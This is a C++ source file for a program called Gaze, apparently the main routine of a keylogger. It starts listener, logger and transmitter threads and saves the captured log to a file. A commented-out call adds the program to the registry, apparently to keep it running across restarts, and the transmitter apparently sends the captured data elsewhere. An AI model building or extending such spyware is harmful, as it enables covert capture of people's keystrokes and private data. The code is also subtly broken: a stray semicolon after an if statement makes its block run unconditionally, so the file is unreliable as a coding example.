// Gaze.cpp : This file contains the 'main' function. Program execution begins and ends there.
// all .cpp files must

#include "pch.h"
#include "Listener.h"
#include "Transmitter.h"
#include <iostream>

using namespace std;

int main()
{	
	//Add to registery
	//Utilities::AddToRegistry();

	// Instanciate the logger, listner and transmitter 
	Logger logger;
	Listener listener(&logger);
	Transmitter transmitter(&logger);

	// Start Transmitter thread
	Thread thread_transmitter(&Transmitter::Start, &transmitter);
	thread_transmitter.launch();

	// Start Logger thread
	Thread thread_logger(&Logger::Update, &logger);
	thread_logger.launch();
	
	// If available load today's log from file and display it to screen 
	if(logger.LoadFromFile());
	{
		cout << "Loaded from file" << endl;
		cout << logger.GetLog() << endl;
	}

	// Start listening and now looping in listener loop
	listener.Start();

	// If F1 is pressed listner stop and qui looping
	cout << "EXITING!" << endl;

	// Stop threads
	transmitter.Stop();
	logger.SetActive(false);

	// Save log to file
	logger.SaveToFile();
	
	return 0;
}